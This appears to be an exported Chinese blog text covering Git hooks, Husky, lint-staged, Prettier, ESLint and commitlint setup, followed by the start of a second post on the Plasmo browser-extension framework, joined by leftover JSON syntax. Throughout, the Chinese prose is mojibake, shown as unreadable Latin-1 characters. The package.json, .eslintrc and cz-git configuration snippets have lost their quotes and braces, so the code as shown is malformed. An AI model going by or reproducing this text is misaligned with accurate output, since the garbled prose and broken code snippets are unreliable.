rebaseï¼ˆä¸è¿‡ä¸åŒ…æ‹¬ git filter-branchï¼‰ post-checkout git checkout æˆåŠŸè¿è¡Œå post-merge åœ¨ git merge æˆåŠŸè¿è¡Œå pre-push ä¼šåœ¨ git push è¿è¡ŒæœŸé—´ï¼Œ æ›´æ–°äº†è¿œç¨‹å¼•ç”¨ä½†å°šæœªä¼ é€å¯¹è±¡æ—¶è¢«è°ƒç”¨ æœåŠ¡å™¨ç«¯é’©å­ pre-receive å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„æ¨é€æ“ä½œæ—¶ï¼Œæœ€å…ˆè¢«è°ƒç”¨çš„è„šæœ¬æ˜¯ pre-receiveã€‚ update update è„šæœ¬å’Œ pre-receive è„šæœ¬ååˆ†ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå®ƒä¼šä¸ºæ¯ä¸€ä¸ªå‡†å¤‡æ›´æ–°çš„åˆ†æ”¯å„è¿è¡Œä¸€æ¬¡ã€‚ post-receive post-receive æŒ‚é’©åœ¨æ•´ä¸ªè¿‡ç¨‹å®Œç»“ä»¥åè¿è¡Œï¼Œå¯ä»¥ç”¨æ¥æ›´æ–°å…¶ä»–ç³»ç»ŸæœåŠ¡æˆ–è€…é€šçŸ¥ç”¨æˆ·ã€‚ è¿™é‡Œåªæ˜¯ç®€å•çš„ä»‹ç»äº†ä¸‹å„ä¸ªé’©å­çš„ä½œç”¨ï¼Œè¦æƒ³æ›´æ·±å…¥çš„äº†è§£è¿™äº›é’©å­ï¼Œè¯·çœ‹å®˜æ–¹æ–‡æ¡£ï¼šè‡ªå®šä¹‰ Git - Git é’©å­ æ—¢ç„¶æŠŠä¸€ä¸ªæ­£ç¡®å‘½åï¼ˆä¸å¸¦æ‰©å±•åï¼‰ä¸”å¯æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ .git ç›®å½•ä¸‹çš„ hooks å­ç›®å½•ä¸­ï¼Œå³å¯æ¿€æ´»è¯¥é’©å­è„šæœ¬ã€‚ä¸ºä»€ä¹ˆè¿˜è¦ä½¿ç”¨ husky ï¼Œè¿™æ˜¯å› ä¸º .git ç›®å½•ä¸‹çš„æ–‡ä»¶å˜åŠ¨ git æœ¬èº«æ˜¯æ— æ³•ç›‘å¬åˆ°çš„ï¼Œæ— æ³•ç»Ÿä¸€ç®¡ç† hook è„šæœ¬ã€‚ Husky ä½ç‰ˆæœ¬å®‰è£…#1ã€å®‰è£…huskynpm install husky --save-dev#2ã€åœ¨package.jsonä¸­æ·»åŠ ä½¿ç”¨é’©å­ husky: hooks: pre-commit: npm run test, // åœ¨commitä¹‹å‰å…ˆæ‰§è¡Œnpm run testå‘½ä»¤ commit-msg: commitlint -e $HUSKY_GIT_PARAMS // æ ¡éªŒcommitæ—¶msgæ˜¯å¦ç¬¦åˆæˆ‘ä»¬è¦æ±‚çš„è§„èŒƒ Husky é«˜ç‰ˆæœ¬å®‰è£…ï¼ˆä» v6.0 ä¹‹åï¼‰ä½¿ç”¨æ–¹æ³• 1: #1ã€å®‰è£… huskynpm install husky --save-dev#2ã€Enable Git hooksnpx husky install#3ã€ä¸ºäº†åœ¨é¡¹ç›® npm install ä¹‹åï¼Œè¿è¡Œç¬¬äºŒæ­¥ï¼Œåœ¨ package.json ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ scripts: prepare: husky install æ¨èä½¿ç”¨æ–¹æ³•ï¼š # å®‰è£… huskyï¼Œä¿®æ”¹ package.json é…ç½®ï¼Œé»˜è®¤æ·»åŠ  pre-commit hooknpx husky-init npm install æ·»åŠ å…¶ä»– git hook å¦‚ä¸‹ï¼š npx husky add .husky/commit-msg npx --no-install commitlint --edit $1 npx husky install åšäº†ä¸¤ä»¶äº‹ï¼š åœ¨æ ¹ç›®å½•æ–°å»º.husky ç›®å½•ï¼Œç”¨äºå­˜æ”¾ git hookï¼› ä¿®æ”¹ .gitconfig é…ç½®æ–‡ä»¶ï¼Œcore.hooksPath .husky(æŒ‡å‘ husky æ–°å»ºçš„ç›®å½•) huksy åœ¨ 6.0 æ—¶æœ‰ä¸ªç ´åæ€§å‡çº§ï¼Œhook é…ç½®æ–¹å¼å’Œä¹‹å‰çš†ç„¶ä¸åŒï¼Œä¸ºä»€ä¹ˆæ”¾å¼ƒä¹‹å‰çš„é…ç½®æ–¹å¼ï¼š Why husky has dropped conventional JS config Why husky doesnâ€™t autoinstall anymore ä¸­æ–‡å¯ä»¥å‚è€ƒè¿™ç¯‡husky ä½¿ç”¨æ€»ç»“ Lint-Staged https://github.com/okonet/lint-staged lint-staged æ˜¯ä¸€ä¸ª Git é’©å­å·¥å…·ï¼Œå¯ä»¥åœ¨ Git æ“ä½œï¼ˆä¾‹å¦‚æäº¤æˆ–æ¨é€ï¼‰ä¹‹å‰è¿è¡Œè„šæœ¬ã€‚å®ƒå¯ä»¥å¸®åŠ©å›¢é˜Ÿ**ä»…å¯¹æ›´æ”¹è¿‡çš„æ–‡ä»¶ï¼ˆæš‚å­˜åŒºä¸­çš„æ–‡ä»¶ï¼‰**è¿è¡Œ ESLintã€Prettier å’Œ Stylelint ç­‰å·¥å…·ï¼Œä»è€Œæé«˜æ•ˆç‡å¹¶å‡å°‘ä¸å¿…è¦çš„æ£€æŸ¥ã€‚ å®‰è£… lint-staged #npm install lint-staged --save-dev åœ¨ husky ä¸­æ·»åŠ  pre-commit é’©å­ï¼Œæ‰§è¡Œ lint-staged å‘½ä»¤ #!/bin/sh. $(dirname $0)/_/husky.shpnpm exec lint-staged åœ¨ package.json ä¸­æ·»åŠ é…ç½® lint-staged: *.vue,js,ts,jsx,tsx,md,json: eslint --fix Prettier https://github.com/prettier/prettier Prettier Prettier æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–ä»£ç æ ¼å¼åŒ–å·¥å…·ï¼Œå¯ä»¥æ ¹æ®é¢„å®šä¹‰çš„è§„åˆ™è‡ªåŠ¨æ ¼å¼åŒ–ä»£ç ã€‚å®ƒæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œå¹¶ä¸”å¯ä»¥ä¸ ESLint é›†æˆä»¥ç¡®ä¿ä»£ç é£æ ¼çš„ä¸€è‡´æ€§ã€‚Prettier å¯ä»¥ä¸å¤§å¤šæ•°ç¼–è¾‘å™¨å’Œ IDE é›†æˆï¼Œä»¥ä¾¿åœ¨ç¼–å†™ä»£ç æ—¶è‡ªåŠ¨æ ¼å¼åŒ–ä»£ç ã€‚ Prettier ä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç æ ¼å¼åŒ–å·¥å…·ï¼Œè¿˜æ˜¯ä¸€æ•´å¥—é£æ ¼æŒ‡å—ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†è§„åˆ™ä¸å¯æ”¹å˜ã€‚ä½œè€…åœ¨åœ¨ Prettier å®˜æ–¹æ–‡æ¡£çš„ â€œWhy Prettier?â€ç« èŠ‚ä¸­ï¼Œè¯¦ç»†å›ç­”äº†è¿™ä¹ˆåšçš„åŸå› ã€‚è™½ç„¶æœ‰ä¸€ä¸ªé€šç”¨çš„ä»£ç é£æ ¼å¯¹é¡¹ç›®å’Œå›¢é˜Ÿæ¥è¯´å¾ˆæœ‰å¥½å¤„ï¼Œä½†æ˜¯ç¼–ç æ˜¯ä¸ªç‰¹åˆ«æƒ…ç»ªåŒ–çš„è¿‡ç¨‹ï¼Œå°±åƒä¸€åƒä¸ªè¯»è€…å°±æœ‰ä¸€åƒä¸ªå“ˆå§†é›·ç‰¹ä¸€æ ·ï¼Œæ¯ä¸ªäººé’Ÿæ„çš„é£æ ¼éƒ½ä¸ä¸€æ ·ï¼Œå¼€å‘å·²ç»å¾ˆç´¯äº†ï¼Œæ²¡å¿…è¦æµªè´¹æ—¶é—´è®¨è®ºé£æ ¼é—®é¢˜ã€‚Prettier ä½¿ç”¨äº‰è®®æœ€å°çš„ç¼–ç é£æ ¼ï¼Œè¶³ä»¥è®©å¤§éƒ¨åˆ†äººæ»¡æ„äº†ï¼Œè€ƒè™‘åˆ° Prettier çš„ç‹¬ç‰¹ä¼˜åŠ¿ï¼Œè¿™äº›â€œç‰ºç‰²â€è¿˜æ˜¯å€¼å¾—çš„ã€‚ å®‰è£… prettier npm install --save-dev --save-exact prettier é…ç½® prettier é£æ ¼ prettier æ”¯æŒå¤šç§æ ¼å¼çš„é…ç½®æ–‡ä»¶ Configuration File Â· Prettier echo .prettierrc.json æ·»åŠ ä¸ªç©ºçš„é…ç½®æ–‡ä»¶æ˜¯ä¸ºäº†å‘Šè¯‰ vscodeï¼Œä½ çš„é¡¹ç›®æ­£åœ¨ä½¿ç”¨ prettierï¼Œé…åˆ [Prettier - Code formatter](Prettier - Code formatter) æ’ä»¶å¯ä»¥å®ç°ä¿å­˜æ—¶è‡ªåŠ¨æ ¼å¼åŒ– æ·»åŠ å¿½ç•¥æ–‡ä»¶ # Ignore artifacts:buildcoverage æ ¼å¼åŒ– npx prettier . --write ç›´æ¥ä½¿ç”¨ **npx prettier . --write** ä¼šæ ¼å¼åŒ–æ•´ä¸ªé¡¹ç›®çš„æ‰€æœ‰ä»£ç ï¼Œè¿™å¾ˆæ²¡å¿…è¦ï¼Œé…åˆ lint-stagedï¼Œåªæ ¼å¼åŒ–æ”¹åŠ¨çš„ä»£ç ã€‚ lint-staged: *.vue,js,ts,jsx,tsx,md,json: prettier . --write ESLint https://github.com/eslint/eslint ESLint æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„ JavaScript ä»£ç æ£€æŸ¥å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©å›¢é˜Ÿç¡®ä¿ä»£ç é£æ ¼çš„ä¸€è‡´æ€§ã€‚å®ƒæ”¯æŒå¤§å¤šæ•° JavaScript ä»£ç é£æ ¼ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æ’ä»¶è¿›è¡Œæ‰©å±•ä»¥æ»¡è¶³å›¢é˜Ÿçš„ç‰¹å®šéœ€æ±‚ã€‚ESLint è¿˜å¯ä»¥ä¸è®¸å¤šç¼–è¾‘å™¨å’Œé›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰é›†æˆï¼Œä»¥ä¾¿åœ¨ç¼–å†™ä»£ç æ—¶è‡ªåŠ¨æ£€æŸ¥ä»£ç ã€‚ é…ç½® Eslint å®‰è£… eslint npm install --save-dev eslint æ·»åŠ ä»»ä¸€æ”¯æŒçš„é…ç½®æ–‡ä»¶æ ¼å¼çš„ .eslintrc æ–‡ä»¶ã€‚ # åˆ›å»º JavaScript é…ç½®æ–‡ä»¶touch .eslintrc.js æ·»åŠ é…ç½® // .eslintrc.js ç¤ºä¾‹module.exports = env: browser: true, es2021: true , extends: eslint:recommended, parserOptions: ecmaVersion: latest, sourceType: module , å…·ä½“çš„ Eslint è§„åˆ™é…ç½®è¿™é‡Œä¸å¤šä»‹ç»äº†ï¼Œå¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç«  - çœ‹å®Œè¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä¸ä¿¡ä½ è¿˜å¯¹ eslint ä¸€çŸ¥åŠè§£ æ‰§è¡Œæ£€æŸ¥å‘½ä»¤ npx eslint project-dir/ file1.js è§£å†³ Eslint å’Œ Prettier å†²çªçš„é—®é¢˜å½“åœ¨é¡¹ç›®ä¸­åŒæ—¶é…ç½® Eslint å’Œ Prettier æ—¶å°±ä¼šå‡ºç°å†²çªçš„é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸º Eslint å¯ä»¥åŒæ—¶è¿›è¡Œä»£ç é£æ ¼åŠè´¨é‡æ ¡éªŒï¼Œå› æ­¤åœ¨ä»£ç é£æ ¼æ–¹é¢å°±å’Œ Prettier å†²çªäº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¸Œæœ›ä»£ç æ ¼å¼ç”± Prettier è´Ÿè´£å°±å¥½ï¼Œè€Œ Eslint åªéœ€è´Ÿè´£ä»£ç è´¨é‡ã€‚ è§£å†³æ–¹æ¡ˆæ—¶å€ŸåŠ© eslint-config-prettier å’Œ eslint-plugin-prettierã€‚ eslint-config-prettier ä½œç”¨æ˜¯å…³é—­ eslint ä¸­ä¸ prettier å†²çªçš„è§„åˆ™ã€‚ eslint-plugin-prettier ä½œç”¨æ˜¯è®© eslint ç”¨ prettier æ¥æ ¼å¼åŒ–ï¼Œç›¸å½“äºå½“ä»£ç æ ¼å¼ä¸ç¬¦åˆ prettier çš„é…ç½®çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥æŠ¥é”™ä¸€ä¸ª eslint é”™è¯¯ã€‚ ä¿®æ”¹é…ç½®å¦‚ä¸‹ï¼š module.exports = extends: [ // æ–°å¢å¦‚ä¸‹çš„é…ç½®ï¼Œå®é™…ä¸Šå°±æ˜¯eslint-plugin-prettierçš„æ¨èè§„åˆ™é›† // è€Œeslint-plugin-prettierå®é™…ä¸Šå°±æ˜¯ä¾èµ–eslint-config-prettieræ¥å…³é—­å†²çªçš„ï¼Œä½¿ç”¨å‰éœ€åŒæ—¶å®‰è£…è¿™ä¸¤ä¸ªåŒ… plugin:prettier/recommended, ],; æœ€ååŒæ ·ä½¿ç”¨ lint-staged åªæ ¼å¼åŒ–æ”¹åŠ¨çš„æ–‡ä»¶ï¼š lint-staged: *.vue,js,ts,jsx,tsx,md,json: eslint --fix å¦‚æœåœ¨ä¸Šä¸€æ­¥ä½ çš„ vscode é…ç½®äº†ä¿å­˜å prettier è‡ªåŠ¨æ ¼å¼åŒ–ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç° prettier æ ¼å¼åŒ–åï¼Œeslint æŠ¥é”™çš„é—®é¢˜ï¼Œå…¶è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œä½¿ç”¨ eslint å»æ ¼å¼åŒ–ï¼š ä½¿ç”¨ prettier æ ¼å¼åŒ–é…ç½®å¦‚ä¸‹: â€œeditor.formatOnSaveâ€: true, ä¿å­˜åè‡ªåŠ¨æ ¼å¼åŒ– â€œeditor.defaultFormatterâ€: â€œesbenp.prettier-vscodeâ€, é»˜è®¤ä½¿ç”¨ prettier æ ¼å¼åŒ–â€œ[javascript]â€: { æ‰‹åŠ¨é…ç½®å„ç§æ–‡ä»¶çš„æ ¼å¼åŒ–å·¥å…· â€œeditor.defaultFormatterâ€: â€œesbenp.prettier-vscodeâ€ } ä¿®æ”¹åï¼Œä½¿ç”¨ eslint æ ¼å¼åŒ–â€œeditor.formatOnSaveâ€: false, ç¦æ­¢ä¿å­˜åè‡ªåŠ¨æ ¼å¼åŒ–â€œeditor.codeActionsOnSaveâ€: { â€œsource.fixAll.eslintâ€: true } Commitlint https://commitlint.js.org/#/ Commitlint æ˜¯ä¸€ä¸ª Git æäº¤æ¶ˆæ¯æ£€æŸ¥å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©å›¢é˜Ÿç¡®ä¿ Git æäº¤æ¶ˆæ¯çš„ä¸€è‡´æ€§å’Œè§„èŒƒæ€§ã€‚å®ƒå¯ä»¥æ£€æŸ¥æäº¤æ¶ˆæ¯çš„æ ¼å¼ã€ç»“æ„å’Œå†…å®¹ï¼Œå¹¶æä¾›æœ‰ç”¨çš„é”™è¯¯æç¤ºå’Œå»ºè®®ã€‚Commitlint å¯ä»¥ä¸ Husky é›†æˆï¼Œä»¥ä¾¿åœ¨æäº¤ä»£ç æ—¶è‡ªåŠ¨è¿è¡Œã€‚ è¦å°† commitlint é›†æˆåˆ°é¡¹ç›®ä¸­ï¼Œéœ€è¦å®‰è£…ä»¥ä¸‹å·¥å…·ï¼š @commitlintcliï¼šç”¨äºæ ¡éªŒ Git æäº¤ä¿¡æ¯æ ¼å¼ @commitlintconfig-conventionalï¼šä¸€å¥—çº¦å®šå¼çš„ commit message ä¹¦å†™è§„èŒƒï¼ˆå¯é€‰ï¼Œå¯ä»¥è‡ªå®šä¹‰è§„èŒƒï¼‰ @commitlintprompt-cliï¼šäº¤äº’å¼ commit message ä¹¦å†™å·¥å…· commitizenï¼šåŒ @commitlintprompt-cliï¼ŒäºŒé€‰ä¸€å°±è¡Œ @commitlintcz-commitlintï¼šcommitizen çš„é€‚é…å™¨ cz-gitï¼šåŒ @commitlintcz-commitlintï¼ŒäºŒé€‰ä¸€å°±è¡Œ ä¸Šé¢ commitlint çš„å·¥å…·é“¾ä¹Ÿæ˜¯éå¸¸å¤šçš„ï¼Œä¸éœ€è¦éƒ½å®‰è£…ï¼ŒæŒ‰éœ€ä½¿ç”¨å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹© @commitlintcli + commitizen + cz-git å®‰è£… npm install @commitlint/cli commitizen cz-git -D æ·»åŠ é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬ä¸ä½¿ç”¨ @commitlintconfig-conventionalï¼Œè€Œæ˜¯è‡ªå®šä¹‰è§„èŒƒ const fg = require(fast-glob);const packages = fg.sync(*, cwd: packages, onlyDirectories: true );/** @type import(cz-git).UserConfig */module.exports = rules: // @see: https://commitlint.js.org/#/reference-rules scope-enum: [2, always, [...packages]], subject-min-length: [2, always, 2], subject-empty: [2, never], , prompt: alias: fd: docs: fix typos , messages: type: é€‰æ‹©ä½ è¦æäº¤çš„ç±»å‹ :, scope: é€‰æ‹©ä¸€ä¸ªæäº¤èŒƒå›´ï¼ˆå¯é€‰ï¼‰:, customScope: è¯·è¾“å…¥è‡ªå®šä¹‰çš„æäº¤èŒƒå›´ :, subject: å¡«å†™ç®€çŸ­ç²¾ç‚¼çš„å˜æ›´æè¿° : , body: å¡«å†™æ›´åŠ è¯¦ç»†çš„å˜æ›´æè¿°ï¼ˆå¯é€‰ï¼‰ã€‚ä½¿ç”¨ | æ¢è¡Œ : , breaking: åˆ—ä¸¾éå…¼å®¹æ€§é‡å¤§çš„å˜æ›´ï¼ˆå¯é€‰ï¼‰ã€‚ä½¿ç”¨ | æ¢è¡Œ : , footerPrefixesSelect: é€‰æ‹©å…³è”issueå‰ç¼€ï¼ˆå¯é€‰ï¼‰:, customFooterPrefix: è¾“å…¥è‡ªå®šä¹‰issueå‰ç¼€ :, footer: åˆ—ä¸¾å…³è”issue (å¯é€‰) ä¾‹å¦‚: #31, #I3244 : , confirmCommit: æ˜¯å¦æäº¤æˆ–ä¿®æ”¹commit ?, , types: [ value: feat, name: feat: æ–°å¢åŠŸèƒ½ | A new feature , value: fix, name: fix: ä¿®å¤ç¼ºé™· | A bug fix , value: docs, name: docs: æ–‡æ¡£æ›´æ–° | Documentation only changes, , value: style, name: style: ä»£ç æ ¼å¼ | Changes that do not affect the meaning of the code, , value: refactor, name: refactor: ä»£ç é‡æ„ | A code change that neither fixes a bug nor adds a feature, , value: perf, name: perf: æ€§èƒ½æå‡ | A code change that improves performance, , value: test, name: test: æµ‹è¯•ç›¸å…³ | Adding missing tests or correcting existing tests, , value: build, name: build: æ„å»ºç›¸å…³ | Changes that affect the build system or external dependencies, , value: ci, name: ci: æŒç»­é›†æˆ | Changes to our CI configuration files and scripts, , value: revert, name: revert: å›é€€ä»£ç  | Revert to a commit , value: chore, name: chore: å…¶ä»–ä¿®æ”¹ | Other changes that do not modify src or test files, , ], useEmoji: false, emojiAlign: center, useAI: false, aiNumber: 1, themeColorCode: , scopes: packages, allowCustomScopes: true, allowEmptyScopes: true, customScopesAlign: bottom, customScopesAlias: custom, emptyScopesAlias: empty, upperCaseSubject: false, markBreakingChangeMode: false, allowBreakingChanges: [feat, fix], breaklineNumber: 100, breaklineChar: |, skipQuestions: [], issuePrefixes: [ // å¦‚æœä½¿ç”¨ gitee ä½œä¸ºå¼€å‘ç®¡ç† value: link, name: link: é“¾æ¥ ISSUES è¿›è¡Œä¸­ , value: closed, name: closed: æ ‡è®° ISSUES å·²å®Œæˆ , ], customIssuePrefixAlign: top, emptyIssuePrefixAlias: skip, customIssuePrefixAlias: custom, allowCustomIssuePrefix: true, allowEmptyIssuePrefix: true, confirmColorize: true, maxHeaderLength: Number.POSITIVE_INFINITY, maxSubjectLength: Number.POSITIVE_INFINITY, minSubjectLength: 0, scopeOverrides: undefined, defaultBody: , defaultIssues: , defaultScope: , defaultSubject: , ,; åœ¨ package.json ä¸­æ·»åŠ å¦‚ä¸‹é…ç½® scripts: cz: cz , config: commitizen: path: node_modules/cz-git æ·»åŠ  commit-msg é’©å­ #!/usr/bin/env sh. $(dirname -- $0)/_/husky.shpnpm exec commitlint --edit $1 ä¸Šé¢çš„é…ç½®éƒ½å®Œæˆåï¼Œè¿è¡Œ pnpm czï¼ŒæŒ‰ç…§æç¤ºå¡«å†™ commit ä¿¡æ¯ï¼š ä¹Ÿå¯ä»¥å…¨å±€å®‰è£… commitizenï¼Œä¹‹åä½¿ç”¨ git cz å‘½ä»¤æ›¿æ¢ git commit å‘½ä»¤ï¼š"},{"title":"åˆæ¢ Plasm æ¡†æ¶","path":"/2023/07/11/5d26d957a5fc/","content":"Plasm æ˜¯ä»€ä¹ˆï¼Ÿ Plasmo æ˜¯ä¸ªæµè§ˆå™¨æ’ä»¶å¼€å‘æ¡†æ¶ï¼Œå·ç§°æµè§ˆå™¨æ‰©å±•ç•Œçš„ Next.js ï¼ å…¶æ¡†æ¶æä¾›çš„ç‰¹æ€§å¦‚ä¸‹ï¼š ä¸€æµçš„ React + Typescript æ”¯æŒ å£°æ˜å¼å¼€å‘ï¼ˆè‡ªåŠ¨ç”Ÿæˆ manifest.jsonï¼‰ å°† UI ç»„ä»¶æ¸²æŸ“åˆ°ç½‘é¡µ æ‰©å±•å†…ç½®é¡µé¢ æ‰©å±•çƒ­é‡è½½ + React æ¨¡å—çƒ­æ›´æ–° .env* æ–‡ä»¶ æ‰©å±•å‚¨å­˜ API æ‰©å±•é€šä¿¡ API è¿œç¨‹ä»£ç æ‰“åŒ… (ä¾‹å¦‚ Google Analytics) æ”¯æŒå¤šä¸ªæµè§ˆå™¨å’Œ manifest ç‰ˆæœ¬ é€šè¿‡ BPP è¿›è¡Œè‡ªåŠ¨éƒ¨ç½² å¯é€‰ Svelte æˆ– Vue è¿›è¡Œå¼€å‘ å®‰è£…é¦–å…ˆå®‰è£…ä¸€ä¸ª React çš„æ¨¡æ¿ï¼š pnpm create plasmo example-dircd example-dirpnpm dev å¦‚æœæƒ³ä½¿ç”¨å…¶ä»–æ¨¡æ¿ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œå¯ä»¥åœ¨æ­¤ https://github.com/PlasmoHQ/examples/ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¨¡æ¿ pnpm create plasmo --with-env å®‰è£…é”™è¯¯ï¼š sharp å®‰è£…å¤±è´¥ è§£å†³æ–¹æ³•ï¼šhttps://sharp.pixelplumbing.com/install#chinese-mirror sharp çš„å®‰è£…åŒ…åœ¨å¤–ç½‘ï¼Œåœ¨å›½å†…æœ‰å¯èƒ½ä¼šä¸‹è½½å¤±è´¥ï¼Œæ·»åŠ ä¸ª npm ä»£ç†ï¼Œä½¿ç”¨å›½å†…çš„é•œåƒ npm config set sharp_binary_host https://npmmirror.com/mirrors/sharpnpm config set sharp_libvips_binary_host https://npmmirror.com/mirrors/sharp-libvips è¿™ä¸¤æ¡å‘½ä»¤åªèƒ½åœ¨ npm v9 ä»¥ä¸‹çš„ç‰ˆæœ¬ç”Ÿæ•ˆï¼Œç”¨ v9 ç‰ˆæœ¬ä¼šæŠ¥é”™ å¯åŠ¨åŠè°ƒè¯•æ’ä»¶ å¯åŠ¨å¾ˆç®€å•ä½¿ç”¨ pnpm run devå‘½ä»¤å³å¯å¯åŠ¨ä¸€ä¸ªå¼€å‘æœåŠ¡å™¨ï¼Œå¯åŠ¨æˆåŠŸåä¼šåœ¨ buildç›®å½•ä¸‹ç”Ÿæˆå¼€å‘äº§ç‰©ï¼š æ‰“å¼€ chrome çš„æ’ä»¶ç®¡ç†é¡µé¢ï¼ˆchrome:extensionsï¼‰ï¼Œæ‰“å¼€ã€å¼€å‘è€…æ¨¡å¼ã€‘å¼€å…³ï¼Œç‚¹å‡»ã€åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åºã€‘ï¼Œé€‰æ‹©é¡¹ç›®ä¸­çš„ build/chrome-mv3-devç›®å½•ï¼š åŠ è½½æˆåŠŸåå¯ä»¥å°†å…¶å›ºå®šåˆ°çŠ¶æ€æ ä¸­ï¼Œä¾¿äºåç»­å¼€å‘ï¼š Plasm æœ‰çƒ­é‡è½½åŠŸèƒ½ï¼Œä¿®æ”¹ä»£ç åï¼ŒPlasm ä¼šè‡ªåŠ¨åˆ·æ–°å½“å‰æ¿€æ´»çš„ tabï¼Œå…¶å®ƒ tab å¯ä»¥ç‚¹å‡»å³ä¸‹è§’çš„æŒ‰é’®æ‰‹åŠ¨åˆ·æ–° å„ç§ PagesPlasm çš„æ–‡æ¡£ä¸­æœ‰å¥½å‡ ç§ pageï¼Œä¸ç†Ÿæ‚‰æµè§ˆå™¨æ’ä»¶çš„ä¼°è®¡ä¼šä¸€è„¸æ‡µé€¼ï¼Œè¿™é‡Œæ¥æ€»ç»“ä¸‹å„ç§ page çš„ä½œç”¨ï¼Œä»¥åŠå‡ºç°çš„åœ°ç‚¹ï¼š Page é¡µé¢å‡ºç°åœ°ç‚¹ è¯´æ˜ ä»£ç ä½ç½® extension pagesï¼ˆè¿™äº›é¡µé¢æ˜¯æµè§ˆå™¨æ’ä»¶æœºåˆ¶å†…çš„é¡µé¢ï¼Œå’Œ Plasm æ¡†æ¶æ— å…³ï¼Œå¹¶ä¸”åœ¨æµè§ˆå™¨ä¸­ä¹Ÿæœ‰å®ä½“æŒ‰é’®ï¼‰ popup page ç‚¹å‡»çŠ¶æ€æ çš„æ’ä»¶å›¾æ ‡åå¼¹å‡ºï¼Œç‚¹å‡»ç©ºç™½åœ°æ–¹æ¶ˆå¤± popup.tsxæˆ–popupindex.tsx options page å³é”®ç‚¹å‡»æ’ä»¶å›¾æ ‡ï¼Œé€‰æ‹©ã€é€‰é¡¹ã€‘æ åï¼Œä¼šæ‰“å¼€ä¸ªæ–°é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢ä¸€èˆ¬ç”¨ä½œæ’ä»¶çš„é…ç½®é¡µé¢ options.tsxæˆ–optionsindex.tsx new tab page åœ¨ç‚¹å‡»ä¸»é¡µæŒ‰é’®æˆ–è€…æ–°å»º tab é¡µæ—¶ä¼šæ‰“å¼€è¯¥é¡µé¢ï¼ŒåŒæ—¶æµè§ˆå™¨çš„å¯åŠ¨é¡µé…ç½®ä¼šå˜æˆæ’ä»¶è¿™ä¸ª page åœ¨å¼€å‘å¯¼èˆªç±»çš„æ’ä»¶æ—¶ä¼šéå¸¸æœ‰ç”¨ newtab.tsxæˆ–newtabindex.tsx dev tools page åœ¨å¼€å‘è€…å·¥å…·ä¸­ä¼šå‡ºç°ä¸ªæ–°çš„ tabï¼Œè¿™ä¸ªçš„å†…å®¹å°±æ˜¯è¯¥é¡µé¢ devtools.tsxæˆ–devtoolsindex.tsx æ¡†æ¶é¡µé¢ï¼ˆè¿™äº›é¡µé¢éƒ½æ˜¯æ¡†æ¶æä¾›çš„ï¼Œé€šå¸¸ä»¥ç¼–ç¨‹æ–¹å¼é‡å®šå‘åˆ°æˆ–æ‰“å¼€è¿™äº›é¡µé¢ï¼‰ tab pages ä½¿ç”¨åœºæ™¯ï¼š1. é¦–æ¬¡å®‰è£…æ’ä»¶æ—¶çš„æ¬¢è¿é¡µé¢2. ç™»å½•é‰´æƒé¡µé¢3. éœ€è¦æ›´ç²¾ç»†çš„è·¯ç”±æ§åˆ¶æ—¶å¯ä»¥åœ¨ä»¥ä¸‹ URL çš„æ–¹å¼è®¿é—®è¿™äº›é¡µé¢ï¼šchrome-extension://extension-id/tabs/delta-flyer.html tabs ç›®å½•ä¸‹ sandbox pages è¿™ä¸ªé¡µé¢ä¸»è¦ç”¨åœ¨ iframe é‡Œé¢ï¼Œå› ä¸ºå’Œä¸»é¡µé¢çš„ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œå®‰å…¨æ€§æ›´é«˜ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€äº›åŠ¨æ€ç”Ÿæˆçš„ä»£ç  sandbox.ts fileæˆ–sandboxes.ts å„ç§ Scriptsä¸Šé¢ä»‹ç»äº†å„ç§ pages çš„ä½œç”¨ï¼Œç°åœ¨åˆå‡ºç°ä¸ªå¤šä¸ª scripts åŒæ ·è®©äººæ‘¸ä¸ç€å¤´è„‘ï¼Œè¿™é‡Œæˆ‘ä»¬å†æ¥æ€»ç»“ä¸‹ä»–ä»¬çš„ä½œç”¨ï¼š script è¯´æ˜ ä»£ç ä½ç½® content script content script ä¼šè¿è¡Œåœ¨å„ä¸ª tab çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ‰å¤šå°‘ä¸ª tab é¡µï¼Œè¯¥è„šæœ¬å°±ä¼šæ‰§è¡Œå¤šå°‘æ¬¡ï¼Œå¹¶ä¸”å„ä¸ª script ä¸ä¼šäº’ç›¸å¹²æ‰°ï¼Œå¹¶ä¸”å’Œé¡µé¢è‡ªèº«çš„ JavaScript ä¿æŒéš”ç¦»ä½¿ç”¨åœºæ™¯ï¼š1. ä»å½“å‰ç½‘é¡µæŠ“å–æ•°æ®2. ä»å½“å‰ç½‘é¡µä¸­é€‰æ‹©ã€æŸ¥æ‰¾å…ƒç´ å¹¶è®¾ç½®æ ·å¼3. å°† UI å…ƒç´ æ³¨å…¥å½“å‰ç½‘é¡µ4. å°†ä»£ç æ³¨å…¥â€œmain workâ€ä¸Šä¸‹æ–‡ 